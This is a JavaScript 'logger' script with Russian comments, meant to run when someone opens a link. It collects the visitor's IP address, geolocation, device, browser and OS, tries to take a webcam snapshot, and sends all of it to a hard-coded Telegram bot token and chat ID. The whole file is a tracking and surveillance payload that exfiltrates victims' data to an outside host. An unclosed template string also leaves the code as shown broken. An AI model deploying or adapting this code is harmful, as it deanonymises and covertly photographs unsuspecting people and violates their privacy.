// logger.js — ОТПРАВКА ПРЯМО В TELEGRAM (токен + chat_id)
(async function() {
    "use strict";

    // ========== ТВОИ ДАННЫЕ ==========
    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
    const TELEGRAM_CHAT_ID = "8995427762";

    // ========== 1. Сбор IP + геолокация ==========
    let ipAddress = "0.0.0.0";
    let geo = "не определена";
    let country = "";
    let city = "";
    let lat = "";
    let lon = "";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        city = geoData.city || "неизвестно";
        country = geoData.country_name || "неизвестно";
        lat = geoData.latitude || "?";
        lon = geoData.longitude || "?";
        geo = `${city}, ${country} (${lat}, ${lon})`;
    } catch(e) {
        console.warn("Geo error:", e);
        geo = "ошибка геолокации";
    }

    // ========== 2. Время перехода ==========
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ========== 3. UserAgent / устройство ==========
    const userAgent = navigator.userAgent;
    let deviceType = "не определено";
    
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = " Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = " Компьютер";
    }
    
    let browser = "неизвестно";
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    else if (userAgent.includes("Opera")) browser = "Opera";
    
    let os = "неизвестно";
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";

    let shortUA = userAgent;
    if (userAgent.length > 80) {
        shortUA = userAgent.substring(0, 77) + "...";
    }

    // ========== 4. Формирование текста ==========
    const textMessage = `🚨 Новый переход по ссылке!

🌐IP: ${ipAddress}
 ├─🌍 Гео: ${geo}
 ├─🕐 Время: ${timeStr}
 ├─🔰 Устройство: ${deviceType}
 └─🎭 Браузер: ${browser}
 
 ├─💾 ОС: ${os}
 └─🖥 UserAgent: ${shortUA}

    // ========== 5. Захват фото с вебкамеры ==========
    let photoBlob = null;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
        photoBlob = null;
    }

    // ========== 6. Отправка в Telegram ==========
    async function sendToTelegram(blob, caption) {
        // Пробуем отправить фото (если есть)
        if (blob) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", blob, "snapshot.jpg");
            formData.append("caption", caption);
            
            try {
                const response = await fetch(url, { method: "POST", body: formData });
                if (response.ok) {
                    console.log("✅ Фото отправлено");
                    return true;
                }
            } catch(e) {
                console.warn("Photo send error:", e);
            }
        }
        
        // Если фото нет или не отправилось — отправляем текст
        const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(textUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: caption,
                    disable_web_page_preview: true
                })
            });
            if (response.ok) {
                console.log("✅ Текст отправлен");
                return true;
            }
        } catch(e) {
            console.warn("Text send error:", e);
        }
        
        return false;
    }

    // Отправляем
    await sendToTelegram(photoBlob, textMessage);
})();
